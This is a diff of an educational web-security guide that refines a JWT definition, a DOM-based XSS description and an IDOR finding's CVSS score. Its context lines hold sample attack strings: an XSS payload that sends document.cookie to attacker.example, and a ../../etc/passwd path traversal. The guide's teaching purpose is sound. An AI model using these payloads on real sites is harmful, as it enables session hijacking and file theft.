@@ -261,7 +261,7 @@ This is the most common serious web vulnerability, and the one most likely to be
 | **Missing function-level control** | The admin API is unauthenticated but unlinked from the UI | Security by obscurity, which is not security |
 | **Forced browsing** | `/backup.zip`, `/.git/config`, `/api/v1/internal` | Nothing in front of the file |
 | **Path traversal** | `?file=../../../../etc/passwd` | The path is built from user input without normalisation |
-| **Metadata manipulation** | Changing `"role":"user"` to `"role":"admin"` in a JWT or a hidden field | The client is trusted |
+| **Metadata manipulation** | Changing `"role":"user"` to `"role":"admin"` in a JWT (JSON Web Token — a signed `header.payload.signature` string the client stores) or a hidden field | The client is trusted |
 
 **The IDOR pattern is worth seeing as code**, because if you have written this, you will recognise it immediately.
 
@@ -539,7 +539,7 @@ XSS is a code injection flaw where an attacker's script runs in the victim's bro
 |---|---|---|---|
 | **Reflected** | In the request, echoed into the response | The victim clicks a crafted link | None — one victim per link |
 | **Stored** | In the database, rendered to every viewer | Anyone who views the page | Persistent, and affects everyone |
-| **DOM-based** | In the page's own JavaScript, from a client-side source | The victim's browser processes the URL fragment | None, and the server never sees the payload |
+| **DOM-based** | In the page's own JavaScript, from a client-side source | The victim's browser processes the query string | None, and the server never sees the payload |
 
 **Stored XSS is the most serious**, because one submission compromises every user who views the page. A comment field, a support ticket, a profile display name — any of these can be the injection point.
 
@@ -558,7 +558,7 @@ XSS is a code injection flaw where an attacker's script runs in the victim's bro
 **The DOM-based flavour is the one developers miss**, because the vulnerability never reaches the server.
 
 ```javascript
-// VULNERABLE — the fragment is written into the page as HTML.
+// VULNERABLE — the query parameter is written into the page as HTML.
 const name = new URLSearchParams(location.search).get("name");
 document.getElementById("greeting").innerHTML = "Hello, " + name;
 // Payload: ?name=<img src=x onerror=fetch('https://attacker.example/'+document.cookie)>
@@ -863,8 +863,8 @@ A finding is a document with a specific audience: a developer who must fix it, a
 ## Finding 3 — Any authenticated user can read any other customer's
 ## order notes (IDOR)
 
-**Severity:** High
-**CVSS 3.1:** 7.1 — AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N
+**Severity:** Medium (base 6.5 — raise it via environmental metrics if the data is customer-confidential in your context)
+**CVSS 3.1:** 6.5 — AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N
 **OWASP Top 10:** A01 Broken Access Control
 **CWE:** CWE-639 — Authorization Bypass Through User-Controlled Key
 **Affected endpoint:** GET /api/v1/orders/{order_id}/notes
@@ -962,7 +962,7 @@ CVSS produces a number from a set of metrics. The number is useful for triage an
 | **Temporal** | Is there a working exploit? Is it officially fixed? | Depends on the situation |
 | **Environmental** | How important is this asset to you specifically? | Set by the organisation |
 
-**The trap is treating the base score as the priority.** An IDOR rated 7.1 on a system holding public marketing data is less urgent than the same 7.1 on a system holding health records.
+**The trap is treating the base score as the priority.** An IDOR rated 6.5 on a system holding public marketing data is less urgent than the same 6.5 on a system holding health records.
 
 The environmental metrics exist for exactly that reason, and most organisations do not fill them in.
 
